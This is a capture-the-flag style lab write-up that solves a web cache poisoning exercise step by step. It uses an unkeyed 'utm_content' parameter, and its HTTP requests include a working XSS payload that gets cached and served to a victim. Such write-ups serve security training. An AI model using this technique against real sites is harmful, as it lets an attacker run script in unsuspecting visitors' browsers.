## Web cache poisoning via an unkeyed query parameter

This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser.

Hint :

Websites often exclude certain UTM analytics parameters from the cache key.

## Notes

- Possibility to leave a comment
- X-Cache Header
- X-Cache-Key
- Cache-Control Header
- reflected word in response
- `X-Cache-Key : /$$`

## Resume

1. Find cached request  
2. Identify cache key behavior  
3. Identify unkeyed UTM parameter  
4. Exploit reflection with XSS  
5. Poison cache  
6. Trigger victim execution  

## Solve

The first step is to find a cached request, in this lab the home page has a cached HTTPS response :

```http
GET / HTTP/2
Host: 0aad00650339764680511ced00150095.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 2
X-Cache: hit
Content-Length: 8357
```

The next step is to confirm how the cache key is built. We use the provided hint and check the cache key:

```http
GET / HTTP/2
Host: 0aad00650339764680511ced00150095.web-security-academy.net
Pragma: x-get-cache-key
```

```http
HTTP/2 200 OK
X-Cache-Key: /$$
```

This confirms that the query string is excluded from the cache key.

Next, we need to identify which parameter is excluded from the cache key but still processed by the application. We use Param Miner "Guess GET parameters".

We identify that `utm_content` is supported.

To validate cache behavior, we add a cache-buster parameter and test the UTM parameter:

```http
GET /?cb=1&utm_content=aaa HTTP/2
Host: 0aad00650339764680511ced00150095.web-security-academy.net
```

We observe that:
- The response is cached (X-Cache: hit after repetition)
- The parameter is reflected in the response

```html
<link rel="canonical" href='//0aad00650339764680511ced00150095.web-security-academy.net/?utm_content=aaa'/>
```

This confirms two important points:
- `utm_content` is excluded from the cache key
- but it is still reflected in the response

Next, we verify cache behavior consistency by removing the UTM parameter while keeping cache behavior stable:

```http
GET /?cb=1 HTTP/2
Host: 0aad00650339764680511ced00150095.web-security-academy.net
```

We still observe cached behavior, confirming that the cache key is independent of `utm_content`.

Now we inject the XSS payload via the unkeyed parameter:

```http
GET /?cb=1&utm_content='/><script>alert(1)</script> HTTP/2
Host: 0aad00650339764680511ced00150095.web-security-academy.net
```

We replay the request until:
- `X-Cache: hit`
- payload is reflected in the response

At this stage, the response containing the payload is stored in the cache.

Finally, we remove the cache-buster and re-send the poisoned request:

```http
GET /?utm_content='/><script>alert(1)</script> HTTP/2
Host: 0aad00650339764680511ced00150095.web-security-academy.net
```

We wait until the cache is updated and the victim loads the home page.

The lab is solved when the victim visits `/` and the payload executes `alert(1)`.